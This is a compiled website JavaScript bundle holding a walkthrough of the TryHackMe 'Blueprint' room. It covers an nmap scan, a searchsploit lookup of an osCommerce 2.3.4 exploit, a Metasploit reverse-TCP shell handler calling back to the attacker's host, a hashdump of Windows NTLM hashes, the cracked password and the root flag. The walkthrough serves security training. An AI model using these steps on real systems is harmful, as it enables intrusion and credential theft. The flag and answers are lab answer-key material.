"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1147],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},c=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,p=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=l(n),d=o,h=u["".concat(p,".").concat(d)]||u[d]||m[d]||a;return n?r.createElement(h,s(s({ref:t},c),{},{components:n})):r.createElement(h,s({ref:t},c))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,s=new Array(a);s[0]=d;var i={};for(var p in t)hasOwnProperty.call(t,p)&&(i[p]=t[p]);i.originalType=e,i[u]="string"==typeof e?e:o,s[1]=i;for(var l=2;l<a;l++)s[l]=n[l];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},22289:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>p,contentTitle:()=>s,default:()=>m,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var r=n(87462),o=(n(67294),n(3905));const a={},s="Blueprint",i={unversionedId:"Tryhackme/Blueprint/Blueprint",id:"Tryhackme/Blueprint/Blueprint",title:"Blueprint",description:"Hack into this Windows machine and escalate your privileges to Administrator.",source:"@site/writeups/Tryhackme/Blueprint/Blueprint.md",sourceDirName:"Tryhackme/Blueprint",slug:"/Tryhackme/Blueprint/",permalink:"/writeups/Tryhackme/Blueprint/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Blue",permalink:"/writeups/Tryhackme/Blue/"},next:{title:"Boiler CTF",permalink:"/writeups/Tryhackme/Boiler CTF/"}},p={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Blueprint",id:"task-1-blueprint",level:2}],c={toc:l},u="wrapper";function m(e){let{components:t,...n}=e;return(0,o.kt)(u,(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"blueprint"},"Blueprint"),(0,o.kt)("p",null,"Hack into this Windows machine and escalate your privileges to Administrator."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/blueprint"},"Blueprint")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Code Injection"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (NTML)")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-blueprint"},"Task 1 Blueprint"),(0,o.kt)("p",null,"Do you have what is takes to hack into this Windows Machine?"),(0,o.kt)("p",null,"It might take around 3-4 minutes for the machine to boot."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Blueprint$ sudo nmap -A -sS -sC -sV -O 10.10.184.207\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 15:43 CEST\nNmap scan report for 10.10.184.207\nHost is up (0.23s latency).\nNot shown: 987 closed ports\nPORT      STATE SERVICE      VERSION\n80/tcp    open  http         Microsoft IIS httpd 7.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: 404 - File or directory not found.\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)\n|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28\n|_http-title: Index of /\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  http/1.1\n445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n3306/tcp  open  mysql        MariaDB (unauthorized)\n8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28\n|_http-title: Index of /\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49158/tcp open  msrpc        Microsoft Windows RPC\n49159/tcp open  msrpc        Microsoft Windows RPC\n49160/tcp open  msrpc        Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=80%CT=1%CU=32590%PV=Y%DS=2%DC=T%G=Y%TM=5F8700\nOS:F5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS\nOS:=7)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I%TS=7)SEQ(SP=102%GCD=1%ISR=104%TI=I\nOS:%II=I%SS=S%TS=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M50\nOS:8NW8ST11%O5=M508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%\nOS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=\nOS:Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q\nOS:=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%\nOS:A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%\nOS:DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=Z%RUCK=0%RUD\nOS:=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s\n|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:3d:f0:27:9e:cb (unknown)\n| smb-os-discovery:\n|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1\n|   Computer name: BLUEPRINT\n|   NetBIOS computer name: BLUEPRINT\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2020-10-14T14:45:16+01:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-10-14T13:45:16\n|_  start_date: 2020-10-14T13:41:38\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT       ADDRESS\n1   37.46 ms  10.8.0.1\n2   228.37 ms 10.10.184.207\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 117.88 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.184.207:8080/"},"http://10.10.184.207:8080/")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"oscommerce-2.3.4")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"searchsploit oscommerce 2.3.4\nsearchsploit -m 44374\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msfconsole -q\nmsf5 > use multi/handler\nmsf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp\npayload => windows/shell/reverse_tcp\nmsf5 exploit(multi/handler) > set lhost 10.9.0.54\nlhost => 10.9.0.54\nmsf5 exploit(multi/handler) > run\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Blueprint$ python3 44374.py\n[+] Successfully launched the exploit. Open the following URL to execute your code\n\nhttp://10.10.184.207:8080//oscommerce-2.3.4./catalog/install/includes/configure.php\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"C:\\xampp\\htdocs\\oscommerce-2.3.4\\catalog\\install\\includes>whoami\nwhoami\nnt authority\\system\n\nmeterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nLab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"30e87bf999828446a1c1209ddde4c450 NTLM googleplus")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cd /users/administrator/desktop\n\nC:\\Users\\Administrator\\Desktop>ls\nls\n'ls' is not recognized as an internal or external command,\noperable program or batch file.\n\nC:\\Users\\Administrator\\Desktop>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 14AF-C52C\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n11/27/2019  07:15 PM    <DIR>          .\n11/27/2019  07:15 PM    <DIR>          ..\n11/27/2019  07:15 PM                37 root.txt.txt\n               1 File(s)             37 bytes\n               2 Dir(s)  19,505,586,176 bytes free\n\nC:\\Users\\Administrator\\Desktop>type root.txt.txt\ntype root.txt.txt\nTHM{aea1e3ce6fe7f89e10cea833ae009bee}\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},'"Lab" user NTML hash decrypted')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"googleplus")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"root.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{aea1e3ce6fe7f89e10cea833ae009bee}")))}m.isMDXComponent=!0}}]);